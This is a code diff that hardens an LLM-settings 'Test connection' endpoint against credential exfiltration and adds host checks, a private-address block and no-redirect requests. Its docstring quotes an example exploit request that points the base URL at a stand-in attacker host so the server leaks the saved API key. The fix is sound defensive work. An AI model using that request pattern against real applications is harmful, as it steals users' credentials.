@@ -583,22 +583,65 @@ def settings_test() -> Response:
 
     Saving a wrong key otherwise fails silently much later, inside a
     reply, where the user cannot tell config from outage.
+
+    The saved key is only ever sent back to the host it was saved for.
+    Without that, POSTing {"llm_base_url": "http://attacker/v1"} made
+    this endpoint read the user's live credential out of config.json and
+    hand it to an arbitrary server — credential exfiltration through a
+    button labelled "Test connection". Testing a new host therefore
+    requires supplying its key in the request.
     """
+    import ipaddress
+    import socket
+    import urllib.parse
+
     import requests as _rq
+
+    from jarvis.config import _load_json
 
     payload = request.get_json(silent=True) or {}
     base = str(payload.get("llm_base_url", "") or "").strip().rstrip("/")
-    key = str(payload.get("llm_api_key", "") or "").strip()
-    if not key:
-        from jarvis.config import _load_json
-        key = (_load_json(_config_path()).get("llm_api_key") or "").strip()
     if not base:
         return jsonify({"error": "base URL is required"}), 400
+
+    parsed = urllib.parse.urlparse(base)
+    if parsed.scheme not in ("http", "https"):
+        return jsonify({"error": "only http and https endpoints can be tested"}), 400
+    if not parsed.hostname:
+        return jsonify({"error": "that URL has no host"}), 400
+
+    saved = _load_json(_config_path())
+    saved_base = str(saved.get("llm_base_url", "") or "").strip().rstrip("/")
+    key = str(payload.get("llm_api_key", "") or "").strip()
+
+    if not key:
+        # Reuse the stored credential only for the host it belongs to.
+        same_host = urllib.parse.urlparse(saved_base).hostname == parsed.hostname
+        if same_host:
+            key = str(saved.get("llm_api_key", "") or "").strip()
+        else:
+            return jsonify({
+                "error": "Enter the API key for this endpoint to test it. "
+                         "The saved key is only sent to the host it was saved for."
+            }), 400
+
+    # Block the loopback/link-local/private ranges. A local endpoint is a
+    # legitimate setup (Ollama, LM Studio), so this is allowed explicitly
+    # rather than by accident — and only when no credential is at stake.
+    try:
+        resolved = ipaddress.ip_address(socket.gethostbyname(parsed.hostname))
+        if (resolved.is_private or resolved.is_loopback or resolved.is_link_local) and key:
+            return jsonify({
+                "error": "Refusing to send a key to a private address. "
+                         "Local servers (Ollama, LM Studio) need no key — leave it blank."
+            }), 400
+    except Exception:
+        return jsonify({"error": "could not resolve that host"}), 400
 
     try:
         resp = _rq.get(f"{base}/models",
                        headers={"Authorization": f"Bearer {key}"} if key else {},
-                       timeout=20)
+                       timeout=20, allow_redirects=False)
         if not resp.ok:
             return jsonify({"error": f"endpoint returned HTTP {resp.status_code}"}), 502
         data = resp.json()
